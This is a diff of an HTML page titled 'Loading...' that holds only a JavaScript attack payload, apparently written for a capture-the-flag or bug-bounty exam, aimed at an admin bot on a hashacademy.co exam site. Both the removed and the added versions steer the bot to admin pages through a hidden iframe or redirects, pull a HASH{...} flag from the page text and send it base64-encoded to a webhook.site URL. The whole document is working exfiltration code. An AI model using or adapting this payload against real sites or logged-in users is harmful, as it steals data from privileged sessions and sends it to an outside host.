@@ -2,34 +2,31 @@
 <html>
 <head><title>Loading...</title></head>
 <body>
-    <script>
-        const webhook = "https://webhook.site/971f2f56-c3ab-45dc-a832-56ace2de76e3";
-        
-        // 1. Tell us the bot is here
-        fetch(webhook + "?status=Bot_Triggered");
-
-        // 2. Open the Flag page in a hidden frame
-        const frame = document.createElement('iframe');
-        frame.src = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
-        frame.style.display = "none";
-        document.body.appendChild(frame);
-
-        // 3. Since the bot is on the SAME DOMAIN as the frame (if the bot is logged in),
-        // we try to read the content after 5 seconds.
-        setTimeout(() => {
-            try {
-                const content = frame.contentWindow.document.body.innerText;
-                const flag = content.match(/HASH\{[^}]+\}/);
-                if(flag) {
-                    fetch(webhook + "?FLAG=" + btoa(flag[0]));
-                } else {
-                    fetch(webhook + "?error=Flag_Not_Found_In_Frame");
+<script>
+    const webhook = "https://webhook.site/4ebaf15d-0a4a-4391-b63b-80e6d40a14ba";
+    const msgId = "69e944edbee6d6b7c664519a"; // Your specific message ID
+    
+    const hunt = () => {
+        const flag = document.body.innerText.match(/HASH\{[^}]+\}/);
+        if (flag) {
+            fetch(webhook + "?FLAG=" + btoa(flag[0]));
+        } else {
+            // If not found, try the other page after a short delay
+            setTimeout(() => {
+                if (!window.location.href.includes(msgId)) {
+                    window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/" + msgId;
                 }
-            } catch(e) {
-                // If CORS blocks us, we do a full redirect as a last resort
-                window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
-            }
-        }, 5000);
-    </script>
+            }, 3000);
+            setTimeout(hunt, 1000);
+        }
+    };
+
+    if (window.location.host.includes("hashacademy")) {
+        setTimeout(hunt, 2000);
+    } else {
+        // First, send them to the main dashboard
+        window.location.href = "https://bugbounty-exam.hashacademy.co/admin/dashboard";
+    }
+</script>
 </body>
 </html>
